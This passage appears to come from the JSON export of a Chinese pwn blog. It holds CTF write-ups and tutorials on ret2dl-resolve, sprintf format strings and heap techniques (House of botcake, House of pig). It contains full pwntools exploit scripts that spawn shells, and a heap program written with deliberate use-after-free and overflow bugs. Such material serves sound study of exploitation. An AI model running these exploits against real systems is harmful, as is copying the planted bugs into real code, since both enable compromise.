io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))add(0,0x18)payload = cyclic(0x18)+p64(0xd91)edit(0,payload)add(1,0x1008)add(2,0x100)show(2)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;__malloc_hook&#x27;]-1632-0x10success(&quot;libc_addr :&quot;+hex(libc_addr))payload = cyclic(0x1008)+p64(0xffffffffffffffff)edit(1,payload)# gdb.attach(io,&#x27;b *$rebase(0xA54)&#x27;)# pause(0)add(3,-0x22020)add(4,0x1000)malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]realloc_hook = libc_addr + libc.sym[&#x27;__realloc_hook&#x27;]realloc_addr = libc_addr + libc.sym[&#x27;realloc&#x27;]payload = cyclic(0x40)+p64(realloc_hook)+b&#x27;\\n&#x27;edit(4,payload)add(5,0x18)onegadget_addr = libc_addr + 0x4f302payload = p64(onegadget_addr)+p64(realloc_addr+10)+b&#x27;\\n&#x27;edit(5,payload)add(6,0x100)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"Ret2dl","slug":"Ret2dl","date":"2023-05-22T14:20:38.000Z","updated":"2023-09-14T17:20:28.000Z","comments":true,"path":"2023/05/22/Ret2dl/","link":"","permalink":"http://example.com/2023/05/22/Ret2dl/","excerpt":"","text":"前言一种基于延迟绑定机制的利用办法 适用于没有puts等输出函数的情况下 伪造结构体 使得任意函数的got表解析成system函数 从而getshell 应该算是pwn学习初期最早的伪造思想了 对于初期的学习还是不那么容易懂的 这个知识点我学的也比较晚 最早出现是刚学pwn没几个月的ISCTF 2022 那个时候做不出来 然后也没去复现 就一直拖到了现在 所以这篇文章的一些描述可能不是很详细 新学pwn的如果哪里看不懂 记得联系我 我删改一下 利用本质32位 Partical RELRO被我们熟知的plt表和got表 是因为延迟绑定机制的出现 这个机制主要是由于可以大幅度减少程序的体积 部分程序调用到的函数比较少 如果全部加载库 很容易就造成体积过大 所以出现了动态链接 RELRO这个保护机制跟动态链接关系比较大 如果是FULL RELRO 那么就会在程序载入时就完成所有函数的got表解析 也就无从谈起利用 观察一下一个read函数的解析过程 在初次调用的时候 got表中指向的是plt表 把0入栈了 同时跳转到了0x8048380 同样入栈了一个参数 这个参数位于got表的第二个元素 我们在动态延迟绑定的文章说过 是模块的ID 随后跳转的地址是got表的第三个元素 同时是我们今天利用的关键 _dl_runtime_resolve函数的地址 下面就来详细分析一下这个函数是如何解析真实地址的 诸如io链中存在vtable这样的结构体 用来索引函数 _dl_runtime_resolve也有对应的结构体来索引各种表项 用来满足其寻找对应函数真实地址的需求 .dynamic段就是这样一个结构体 其存放了动态链接的几个关键表项.dynsym .dynstr .rela.plt等 _dl_runtime_resolve利用入栈的模块ID 这里又称为link_map 可以访问到dynamic段 从而获取其他表的地址 这里我们先不讲这几个表项的作用 跟着思路往下走 在_dl_runtime_resolve拿到表项地址以后 他怎么知道要寻找的是哪个函数的真实地址呢 或者说 小明妈妈让他买酱油 这个行为确实是触发了 但是小明不知道要买什么品牌的酱油 这个时候其会先寻找重定位表项 同样的 其仍然需要一个索引 否则他怎么知道要找哪个函数的重定位表项 而这个偏移 就是最开始入栈参数 索引到重定位表项后 其就需要函数名 以此在so文件中寻找对应的真实地址 不过在索引dynstr到这个段获取字符串前 先需要到达dynsym段进行一个中转 而寻找到对应地址的偏移 就是上面的第二个参数 就拿我们上面的read的重定位表举例 第二个参数是0x107 这个值是怎么得到的呢 首先 7是固定的 可以理解为函数的标识 这个值可不能进行更改 在寻址过程中还会进行检查 前面的0x100是如何得到的呢 实际是由1&lt;&lt;8得到 这里的逻辑左移八位是固定的格式 _dl_runtime_resolve在读取到0x107后 会自动的逻辑右移 得到一个1 这个1乘以0x10 (这个值是dym结构体一个成员的大小) 就是dynsym表的偏移了 我们来观察一下dynsym表的内容 除开0x804820c所对应的_gmon_start函数比较特殊之外 其余的sym表的第四个参数固定为0x12 这在后续中也存在检查 中间两个参数都是0 没啥可说的 来看一下第一个参数 这个参数就是用来索引dynstr表 直接对应的就是函数字符串存储地址减去dynstr的起始地址 到此为止 _dl_runtime_resolve函数的调用流程就已经清晰了 稍微总结一下 索引的流程为: 压入link_map参数 索引dynamic段 根据压入的偏移参数寻址重定位表项 根据重定位表项寻址dynsym表 根据dynsym表索引dynstr表 最后获取到函数名 所以我们只要环环相扣 一步步伪造偏移 劫持索引流 就可以做到劫持read函数(任意函数都行) 将其真实地址的解析修改为system函数 就可以getshell 伪造32位 Partical RELRO借助这样一个32位的程序来演示 程序的逻辑非常简单 就一个read 构成栈溢出 可以自行编译 ssize_t vuln()&#123; char buf[40]; // [esp+0h] [ebp-28h] BYREF return read(0, buf, 0x100u);&#125; 由于我们需要伪造偏移 所以需要有一个可写可读的地址来存放我们的fake struct 理所当然的是bss段 于是这里直接构造read链 往bss段上读入数据 随后我们来想一下如何伪造偏移 上面提到 _dl_runtime_resolve解析dynamic段 需要靠压入的link_map参数 我们可以利用这个gadget来实现 .plt:08048380 sub_8048380 proc near ; CODE XREF: .plt:0804839B↓j.plt:08048380 ; .plt:080483AB↓j ....plt:08048380 ; __unwind &#123;.plt:08048380 push ds:dword_804A004.plt:08048386 jmp ds:dword_804A008.plt:08048386 sub_8048380 endp 随后我们应该跟上用来索引重定位表项的偏移 这里的偏移就是fake_relplt_addr - relplt_addr 随后 我们需要伪造重定位表项 其第一个参数为想要误导的函数got表地址(哪怕是已经解析过真实地址的函数也可以 甚至是任意的可写地址都行 不过为了方便getshell 一般都是放到函数的got表里) 第二个参数用来索引dynsym表 第二个参数的伪造可以说是最关键的一步 因为dynsym其一个成员是0x10字节 同时还存在着对齐 所以要留意一下原本的dynsym起始地址的最后一位 比如我这个程序其最后一位是0xc 所以我伪造的dynsym的起始地址最后一位也应该为0xc 同时 fake_dynsym与dynsym的偏移 需要经过我上面提到的计算 最后的结果用来充当第二个参数 接着就是dynsym的伪造问题 一共有四个参数 后三个参数不用管 固定是 0，0，0x12 而第一个参数为fake_dynstr和dynstr的偏移 直接相减就行了 如果最后我们成功劫持了函数的解析 成功在read函数的got表中写入了system函数的真实地址 我们要如何getshell呢 我们知道 动态链接的最后 在得到了真实地址后 会重新调用一次该函数 所以 我们只需要重新调用函数时 rsp指针指向的第二个字长处(第一个字长为返回地址 拿垃圾数据填就行了)存放着binsh字符串地址即可 参考模板: plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addrrel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addrdynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addrdynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addrbss_addr = elf.bss(0x800)fakesym_addr = bss_addr+0x1cname_addr = fakesym_addr+0x10-dynstrfakesym = p32(name_addr)+p32(0)*2+p32(0x12)offset = int((fakesym_addr-dynsym)/0x10)offset = offset&lt;&lt;8fake_relplt = p32(elf.got[&#x27;read&#x27;])+p32(offset+7)read_addr = elf.sym[&#x27;read&#x27;]vuln_addr = elf.sym[&#x27;vuln&#x27;]payload = cyclic(0x28+0x4)+p32(read_addr)+p32(vuln_addr)+p32(0)+p32(bss_addr)+p32(0x100)# gdb.attach(io,&#x27;b *0x804854B&#x27;)# pause(0)io.send(payload)binsh_addr = bss_addr+0x80payload = p32(plt0)+p32(bss_addr+0x10-rel_plt)payload += cyclic(0x4)payload += p32(binsh_addr)payload += fake_relpltpayload += cyclic(0x4)payload += fakesympayload += b&#x27;system\\x00\\x00&#x27;payload = payload.ljust(0x80,b&#x27;\\x00&#x27;)payload += b&#x27;/bin/sh\\x00&#x27;io.send(payload)leave_addr = 0x08048448payload = cyclic(0x28)+p32(bss_addr-0x4)+p32(leave_addr)io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"另类格式化字符串漏洞","slug":"另类格式化字符串漏洞","date":"2023-05-21T13:23:17.000Z","updated":"2023-09-14T17:18:22.000Z","comments":true,"path":"2023/05/21/另类格式化字符串漏洞/","link":"","permalink":"http://example.com/2023/05/21/%E5%8F%A6%E7%B1%BB%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"这篇主要介绍的是spritf函数引起的格式化字符串漏洞 总体的利用方式和printf是一样的 先来看一下sprintf函数的用法 其一共有三个参数 在不使用格式化字符的情况下 第三个参数可有可无 #include&lt;stdio.h&gt;void vuln()&#123; char buf[0x20]; sprintf(buf,&quot;hello\\n&quot;); printf(buf);&#125;int main()&#123; vuln();&#125; 主要的作用就是把hello这个字符串读入到buf数组变量中 来看一下运行的结果 如果使用上格式化字符 #include&lt;stdio.h&gt;void vuln()&#123; char buf[0x20]; char a[0x20] = &quot;hello&quot;; sprintf(buf,&quot;%s\\n&quot;,a); printf(buf);&#125;int main()&#123; vuln();&#125; 这里可能会误解为传入到buf中的值是%shello 随后是给予printf函数利用格式化字符串输出 其实不然 这里替换成puts来试一下 #include&lt;stdio.h&gt;void vuln()&#123; char buf[0x20]; char a[0x20] = &quot;hello&quot;; sprintf(buf,&quot;%s&quot;,a); puts(buf);&#125;int main()&#123; vuln();&#125; 断点打在sprintf函数这里来看一下 来看执行后0x7fffffffe050地址的值会被赋值成什么 由此可见 这里的格式化字符实际是决定vararg参数存储的类型 如果我们替换成%p呢 印证了猜想 那么%n呢 这个printf最强大的漏洞 可以做到任意地址写任意值 在这里是否奏效呢 #include&lt;stdio.h&gt;void vuln()&#123; char buf[0x20]; sprintf(buf,&quot;a%7$n&quot;);&#125;int main()&#123; vuln();&#125; 不同于其他格式化字符 %n在sprintf就可以起到任意写的作用 同时又和printf一样 默认是修改4个字节 如果想要修改8字节 就需要lln 如果我们修改蓝框中的值 使其占满8字节 再来覆盖看看 本质还是和printf差不多 在关键的任意写这块漏洞利用上 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"House of botcake","slug":"House-of-botcake","date":"2023-05-21T11:52:20.000Z","updated":"2023-09-14T17:19:24.000Z","comments":true,"path":"2023/05/21/House-of-botcake/","link":"","permalink":"http://example.com/2023/05/21/House-of-botcake/","excerpt":"","text":"碎碎念应该不算一个链 只能说一种堆风水的手法吧 叫这个名字有点怪怪的 不过总归是一个很好的手法 适用于没有堆溢出 但是有UAF 而且比较少见 不过不排除有的厉害的师傅自己就能发现这个手法。。。 我还是太菜了 分析2.27 以后(指9.0那个新版本) tcachebin 新增了key 给double free起了干扰的作用 如果要绕过 有三种办法 1.覆盖tcachebin的bk域 也就是key 2.修改tcachebin chunk的size 使其key检测的时候绕开原本的链表 3.house of botcake 这个手法的本质 是利用chunk overlap来突破没有堆溢出的限制 覆盖fd域 我们知道 在chunk被释放进入tcachebin后 其bk域会被写入key 如果想要再次释放 就需要绕过key 但是 如果chunk是先被释放进入unsortedbin呢 当我们填满tcachebin链表后 再次释放同大小的chunk 就会释放进入unsortedbin 此时再从tcachebin链表中申请出来一个chunk 再次释放已经被释放进入unsortedbin chunk 就可以成功释放两次 此时如果再次申请一个比原本的chunk大的chunk 就会从合并后的chunk中分配 从而可以覆盖到位于tcachebin chunk的fd域 这样就达到了任意写的目的 上面这么讲可能不明不白 下面直接来看吧 利用首先填满tcachebin的一个链表 for i in range(9): add(0x200)for i in range(7): delete(i+2)delete(0)delete(1) chunk0和chunk1用来释放进入unsortedbin 此时二者成功合并 我们再次申请一个0x200的chunk 把链表腾出一个位置 随后再次释放chunk1 成功进入tcachebin链表 add(0x200)delete(1) 此时随便申请一个比0x200大 比0x410小的chunk 就可以触碰到chunk1的fd域了 从而实现任意地址写 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"LitCTF2023","slug":"LitCTF2023","date":"2023-05-15T14:44:33.000Z","updated":"2023-09-14T17:19:54.000Z","comments":true,"path":"2023/05/15/LitCTF2023/","link":"","permalink":"http://example.com/2023/05/15/LitCTF2023/","excerpt":"","text":"跟着vn的师傅打 拿了第七 但是说实话pwn题出的太烂了 唯一有难度的一题还是抄的祥云杯2022-protocol 考点一模一样 从pwn方向我的评价就是一坨狗屎 其他方向不会不做评价 [LitCTF 2023]ezlogin静态编译 删除了符号表 用sig文件解决就行 使用自己百度 这里贴一个比较齐全的sig文件仓库 push0ebp&#x2F;sig-database: IDA FLIRT Signature Database (github.com) int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rdx __int64 v4; // rdx __int64 v6; // [rsp+0h] [rbp-108h] BYREF setbuf(off_6B97A8, 0LL, envp); setbuf(off_6B97A0, 0LL, v3); setbuf(off_6B9798, 0LL, v4); while ( !(unsigned int)vuln(&amp;v6) ) ; IO_puts(&quot;GoodTime.&quot;); return 0;&#125; 重复执行vuln函数 当vuln函数的返回值为1时退出循环 _BOOL8 __fastcall vuln(__int64 a1)&#123; char v2[536]; // [rsp+0h] [rbp-218h] BYREF IO_puts(&quot;Input your password:&quot;); memset(v2, 0, 0x200uLL); if ( (unsigned __int8)_libc_read(0, v2, 0x200uLL) &gt; 0x50u ) exit_0(-1); j_strcpy_ifunc(a1, v2); return strcmp(v2, &quot;PASSWORD&quot;) == 0;&#125; 有一个strcpy的栈溢出 a1相当于v6 a1可以输入0x200字节 而v6只需要0x100字节就可以溢出 不过对于read函数有一个返回值检测 超过0x50就终止程序 但是实际的比较存在漏洞 我们来看一下汇编 .text:0000000000400C07 cmp al, 50h ; &#x27;P&#x27;.text:0000000000400C09 ja short loc_400C3E 对比的是al寄存器 al寄存器是rax的低八位 也就是说如果我们这个数值比较大 使得二进制形式的数值的1集中在前面 低8位的数值就比较小 测试下来就是不能超过0x150字节 那么我们就可以构造rop链了 不过由于\\x00会被strcpy截断 所以我们需要先覆盖一下payload中的\\x00为其他字节 随后由后往前写 就是payload不断缩减 在\\x00字节处做标记 输出的时候多一个\\x00 用来覆盖原本的\\x00 完整exp: from pwn import*io = remote(&quot;node5.anna.nssctf.cn&quot;,28824)#io = process(&quot;./pwn4&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn4&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]syscall = 0x448D22rdi_addr = 0x400706rsi_addr=0x410043 rdx_addr = 0x448c95 rax_addr = 0x4005af bss_addr = elf.bss(0x300)start_addr = 0x400AB0main_addr = 0x4005c0ret_addr = 0x400416payload = b&#x27;PASSWORD&#x27;+cyclic(0x100)+p64(rdi_addr)+p64(0)+p64(rax_addr)+p64(0)+p64(rsi_addr)+p64(bss_addr)+p64(syscall)+p64(main_addr)payload = payload.ljust(0x200,b&#x27;a&#x27;)#payload = payload.replace(b&#x27;\\x00&#x27;, b&#x27;\\x11&#x27;)list = []for i in range(0x198) : if payload[i] == &#x27;\\x00&#x27; : list.append(i) payload = payload[0:i] + b&#x27;\\x66&#x27; + payload[i+1:]list = list[::-1]for i in list : payload = payload[0:i]+b&#x27;\\x00&#x27; io.recvuntil(&quot;Input your password:&quot;) # gdb.attach(io,&#x27;b *0x400C07&#x27;) # pause(0) io.send(payload) # pause()payload = &quot;PASSWORD\\x00&quot;io.recvuntil(&quot;Input your password:&quot;)# gdb.attach(io,&#x27;b *0x40061A&#x27;)# pause(0)io.send(payload)# pause()io.sendline(b&#x27;/bin/sh\\x00&#x27;)payload = b&#x27;PASSWORD&#x27;+cyclic(0x100)+p64(rax_addr)+p64(59)+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(0)+p64(syscall)payload = payload.ljust(0x200,b&#x27;a&#x27;)list = []for i in range(0x200) : if payload[i] == &#x27;\\x00&#x27; : list.append(i) payload = payload[0:i] + b&#x27;\\x66&#x27; + payload[i+1:]list = list[::-1]for i in list : payload = payload[0:i]+b&#x27;\\x00&#x27; io.recvuntil(&quot;Input your password:&quot;) io.send(payload)payload = &quot;PASSWORD\\x00&quot;io.recvuntil(&quot;Input your password:&quot;)io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"MiNi L CTF2023","slug":"MiNi-L-CTF2023","date":"2023-05-15T14:00:54.000Z","updated":"2023-09-14T17:20:02.000Z","comments":true,"path":"2023/05/15/MiNi-L-CTF2023/","link":"","permalink":"http://example.com/2023/05/15/MiNi-L-CTF2023/","excerpt":"","text":"3calls这题的调试是个问题 比赛的时候一直卡在调试 赛后看了wp 才意识到 原来是另外一个进程导致的调试失败 只要在ida里把check函数改成nop就行了 int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // [rsp+8h] [rbp-28h] int j; // [rsp+Ch] [rbp-24h] setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); libc = (__int64)(&amp;printf - 49390); printf(&quot;gift: %p\\n&quot;, &amp;printf - 49390); for ( i = 0; i &lt;= 2; ++i ) read(0, &amp;F[i], 8uLL); check(); puts(&quot;good job!&quot;); for ( j = 0; j &lt;= 2; ++j ) F[j](); return 0;&#125; 直接给了libc基址 同时可以输入3个字长 并且对这三个字长进行检查 跟进一下check函数 unsigned __int64 check()&#123; int v0; // ebx int i; // [rsp+0h] [rbp-C0h] int j; // [rsp+4h] [rbp-BCh] FILE *stream; // [rsp+8h] [rbp-B8h] int v5; // [rsp+14h] [rbp-ACh] int v6; // [rsp+18h] [rbp-A8h] int v7; // [rsp+1Ch] [rbp-A4h] char v8[96]; // [rsp+20h] [rbp-A0h] BYREF char s2[40]; // [rsp+80h] [rbp-40h] BYREF unsigned __int64 v10; // [rsp+A8h] [rbp-18h] v10 = __readfsqword(0x28u); v5 = 0; v6 = 0; v7 = 0; for ( i = 0; i &lt;= 2; ++i ) sprintf(&amp;v8[32 * i], &quot;%016llx&quot;, (char *)F[i] - libc); stream = popen(cmd, &quot;r&quot;); if ( (__int64)stream &lt;= 0 ) &#123; puts(&quot;popen failed!&quot;); exit(-1); &#125; while ( (unsigned int)__isoc99_fscanf(stream, &quot;%s&quot;, s2) != -1 ) &#123; for ( j = 0; j &lt;= 2; ++j ) &#123; v0 = *(&amp;v5 + j); *(&amp;v5 + j) = (strcmp(&amp;v8[32 * j], s2) == 0) | v0; &#125; &#125; pclose(stream); if ( (v6 &amp; v5 &amp; v7) == 0 ) &#123; puts(&quot;Not libc symbols!&quot;); exit(-1); &#125; return v10 - __readfsqword(0x28u);&#125; 重点注意一下这一句stream &#x3D; popen(cmd, “r”); popen可以调用shell命令 并且获取其返回值 那么看一下cmd指令是什么 然后直接丢到我们虚拟机里的shell执行一下 大概就知道check是干啥的 返回值是一大串偏移量 应该很明显看的出来是libc函数的偏移量 加上下面的for循环 所以可以得到check函数是检测输入的三个字长是否是libc函数 调用三次函数来获取shell 那么肯定要用到system函数 至于rdi参数要怎么操控 那么只能采用输入函数了 read scanf gets 这些常见的函数 参数构造最容易的就是gets了 并且其输入的地址也是由rdi决定 如果输入&#x2F;bin&#x2F;sh 那么rdi参数就是&#x2F;bin&#x2F;sh字符串 不过你直接打断点调试行不通的 popen函数会产生新的进程 影响我们gdb调试 所以我们直接在ida里面把call check改了 可以看到gets函数rdi参数是一个可写可读的地址 那这样就方便了 我们直接读入&#x2F;bin&#x2F;sh字符串 但是很快就会发现程序EOF了 EOF的原因比较复杂 我也只是调试了一点点出来 很多地方还是不懂 权当听个大概吧 出问题的就在这个判断 导致进入了__lll_lock_wait_private函数 这个函数的具体用处我也不是很清楚 反正执行的后果就是当前进程会被挂起 也就导致了我们的程序无法继续执行了 也有想过绕过 但是貌似就算相等也过不去 ZF标志位还是为0 最后的解决办法跟我们的gets函数执行逻辑有关系 其会先调用这个函数 这个函数的本质是通过read来输入字节 不过每次只有1字节 随后每次接收完以后进行判断 如果为\\n就停止gets 所以我们直接输入\\n 就不会执行到后面的__lll_lock_wait_private 随后我们再次调用gets函数就正常了 也是很神奇 不知道为啥 但是你会发现最后system执行的参数为&#x2F;bin.sh 还是需要动调看一下 问题出在gets函数的最后几步 自己看看应该也能懂 这样就不多说了 最后直接system就行了 from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;gift: 0x&quot;)libc_addr = int(io.recv(12),16)success(&quot;libc_addr :&quot;+hex(libc_addr))gets_addr = libc_addr + libc.sym[&#x27;gets&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]io.send(p64(gets_addr))io.send(p64(gets_addr))io.send(p64(system_addr))# gdb.attach(io,&#x27;b *gets+201&#x27;)# pause(0)io.send(b&#x27;\\n&#x27;)# gdb.attach(io,&#x27;b *$rebase(0x158E)&#x27;)io.sendline(b&#x27;/bin0sh&#x27;)# pause()io.interactive()# gdb.attach(io,&#x27;b *_IO_file_underflow+134&#x27;) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"House of pig","slug":"House-of-pig","date":"2023-05-12T04:36:26.000Z","updated":"2023-09-14T17:19:42.000Z","comments":true,"path":"2023/05/12/House-of-pig/","link":"","permalink":"http://example.com/2023/05/12/House-of-pig/","excerpt":"","text":"前言针对calloc函数不能申请tcachebin的一种利用链 通过伪造file结构体 调用io_str_overflow函数来获取shell 总体的伪造难度不是很大 强烈建议先只看io链的调用 不看我的解析 然后尝试自己伪造file结构体 可以很大程度提高能力 调用链分析这条链的触发形式 还是跟高版本下的链差不多 通过覆盖IO_list_all 来在堆上伪造file结构体 从而覆盖到vtable 不过本链的vtable并不需要我们伪造 原本的vtable是 IO_file_jumps指针 如果触发IO_flush_all_lockp函数 那么就会调用到IO_file_jumps对应偏移处的IO_file_overflow函数 与之对应的 如果我们将vtable修改为IO_str_jumps呢 那么索引到的就会是 IO_str_jumps函数 这个函数就是我们今天所利用的关键 ida打开2.31的libc文件 来看一下函数内部进行了什么样的操作 先进行了malloc 再利用memcpy往申请到的堆空间写入数据 再次调用free函数 那么这里就存在一个致命的漏洞 我们刚才说到 这条链是使用于没有malloc函数 只有calloc函数 无法调用到tcachebin中的chunk 但是我们可以通过Tcache stashing unlink attack 来把hook函数写入到tcachebin中 接着利用这里面的malloc申请出来 同时利用memcpy来覆盖hook函数 最后 如果我们覆盖的是free_hook 再伪造v4参数为&#x2F;bin&#x2F;sh 就可以触发system(“&#x2F;bin&#x2F;sh”) 那么总结一下 我们为了伪造链 并触发其 需要做到: 1.覆盖IO_list_all为堆地址2.往tcachebin链表中写入free_hook-0x10(之所以要减去0x10 后面会提及)3.构造fake_file 覆盖vtable为IO_str_jumps 伪造IO_str_overflow需要的参数 触发system 同时第二步需要注意 我们在Tcache stashing unlink attack中提到 要想把fake chunk放到tcachebin上 还需要满足fake chunk+0x8处为一个可写地址 所以实际上我们要利用largebin attack任意写两次 看到这里 你就可以试着自己去伪造一下file结构体了 尝试是否能够打通 下面是我自己一直在用的调试源码 可以自行编译 里面包含了大部分常见的漏洞 可以给复现很大帮助 #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;void gift()&#123; size_t puts_addr = (size_t)&amp;puts; printf(&quot;%p&quot;,(void *)puts_addr);&#125;void menu()&#123; puts(&quot;Life is fucking movie&quot;); puts(&quot;Life is always full of unhappiness, like this question&quot;); puts(&quot;Anyway, what&#x27;s your answer&quot;); puts(&quot;&gt;&quot;);&#125;void add()&#123; int index; char size[20]; puts(&quot;What do you really want?&quot;); if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123; if(!chunk_ptr[chunk_time])&#123; printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time); puts(&quot;You can customize the size of chunk, but what about your life&quot;); read(0,size,0x8); chunk_size[chunk_time] = atoi(size); chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]); chunk_time++; &#125;else&#123; puts(&quot;error&quot;); exit(0); &#125; &#125;else&#123; exit(0); puts(&quot;&quot;); &#125;&#125;void add2()&#123; int index; char size[20]; puts(&quot;What do you really want?&quot;); if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123; if(!chunk_ptr[chunk_time])&#123; printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time); puts(&quot;You can customize the size of chunk, but what about your life&quot;); read(0,size,0x8); chunk_size[chunk_time] = atoi(size); chunk_ptr[chunk_time] = calloc(1,chunk_size[chunk_time]); chunk_time++; &#125;else&#123; puts(&quot;error&quot;); exit(0); &#125; &#125;else&#123; exit(0); puts(&quot;&quot;); &#125;&#125;void delete()&#123; char data[100]; int index; puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;); scanf(&quot;%d&quot;,&amp;index); free(chunk_ptr[index]);&#125;void edit()&#123; int index; int size; puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;); scanf(&quot;%d&quot;,&amp;index); puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;); scanf(&quot;%d&quot;,&amp;size); puts(&quot;Come back!&quot;); read(0,chunk_ptr[index],size);&#125;void show()&#123; puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;); int index; scanf(&quot;%d&quot;,&amp;index); puts(chunk_ptr[index]);&#125;int main()&#123; int choice; init(); puts(&quot;This program is used to debug heap vulnerabilities&quot;); puts(&quot;write by chen&quot;); while(1)&#123; menu(); scanf(&quot;%d&quot;,&amp;choice); switch(choice)&#123; case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; case 6: add2(); break; case 7: puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;); puts(&quot;You will be stronger next time I see you&quot;); exit(0); break; &#125; &#125;&#125; 接下来的详细伪造 我也会以此程序举例 伪造过程分析如何覆盖IO_list_all和把free_hook-0x10放到tcachebin链表上的过程这里就不过多赘述了 还需要根据题目情况来完成 直接来看如何伪造 如果al寄存器的二进制形式最后一位为1 就会跳转 显然这里不能让他跳转 所以要控制一下rax寄存器的值 往上朔源一下 可以发现和rdi寄存器有关系 而rdi寄存器经过动调发现 rdi的值是用来伪造file结构体的堆块的chunk头的prev_size域 使其最后一位不为1即可 接下来 顺利来到malloc函数 申请多大的chunk和rdi寄存器有关系 索引一下发现和r12寄存器有关系 r12的初始值由rbx+0x40处的地址决定 随后减去了r14的值 最后malloc申请的大小等于r12*2 + 0x64 同时rbx的值和rdi是一样的 所以这里r14的值和r12也可以被我们赋值 那么这里r12的值就要为 *malloc_size &#x3D; (r12-r14) 2 + 0x68 由于free_hook-0x10放入的tcachebin链表范围很大 所以这里的size其实不用太担心 接着往下看 memcpy在gdb中的形式是这个函数 我也不知道啥原因 总之si进去看看怎么个赋值法 由这四行汇编决定 其中vmovdqu可以操作128位的数据 也就是0x10字节 至于是采用xmm0寄存器来赋值 还是xmm1寄存器 我们来看一下决定地址的rdi寄存器,rsi寄存器,rdx寄存器 回顾一下进入memcpy函数前的三行汇编 rdi的值和rax有关系 rdx的值和r12有关系 而影响xmm寄存器的rsi和r14有关系 那我们来屡一下思路 首先 rdi+rdx-0x10 一定要能覆盖到free_hook 结合上面所说的 可以操作128位的数据 所以最后的地址为free_hook-0x8是最后的底线了 rdi的值没有办法更改 和rax挂钩 而rax是用来伪造的堆的chunk头起始地址 所以rdx为0x18是一个比较合适的值 那么还有一个rsi寄存器的值 和r14挂钩 我们之前不是说过 r12还要减去r14 然后再计算成为malloc的参数嘛 所以r14这里要想给xmm寄存器赋值system函数的真实地址(用来覆盖free_hook) 就需要r14是一个存放system地址的地址 那么这里自然是一个堆地址合适 可以供我们控制 那么r12的值就是r14+0x18 那么这里各个寄存器的值都确定下来了以后 还有一个cmp需要注意 rsi的值需要大于rcx才行 setz这条汇编指令把ZF标志位的值传给了cl寄存器 这里我试了下貌似都是1 所以rcx最后的值为r12-r14+1 也就是0x19 那么rsi的值只要大于这一个就可以了 而rsi的值有rbx+0x20处决定 那么还有最后一步了 就是调用free函数时的rdi寄存器 这个地址相当于chunk的size域 